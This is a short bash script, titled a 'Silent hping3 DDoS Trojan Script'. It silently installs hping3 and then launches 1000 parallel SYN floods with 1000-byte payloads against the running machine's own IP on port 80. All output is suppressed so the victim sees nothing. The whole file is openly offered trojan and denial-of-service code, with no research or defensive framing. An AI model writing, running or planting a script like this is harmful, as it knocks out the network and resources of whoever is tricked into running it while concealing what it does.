#!/bin/bash

# Silent hping3 DDoS Trojan Script

# Install hping3 silently if not installed
if ! command -v hping3 &> /dev/null; then
    apt-get update -qq && apt-get install -y -qq hping3 >/dev/null 2>&1
fi

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    exit 1
fi

# Check for correct number of arguments
if [ "$#" -ne 2 ]; then
    exit 1
fi

INTERVAL=$1
COUNT=$2
THREADS=1000
BYTES=1000

# Obtain the user's IP address
USER_IP=$(hostname -I | awk '{print $1}')

if [[ -z "$USER_IP" ]]; then
    exit 1
fi

# Run hping3 in 1000 parallel threads targeting port 80
for ((i = 1; i <= THREADS; i++)); do
    hping3 -S -p 80 -d $BYTES -c $COUNT -i ${INTERVAL}ms $USER_IP >/dev/null 2>&1 &
done

# Wait for all background processes to finish
wait
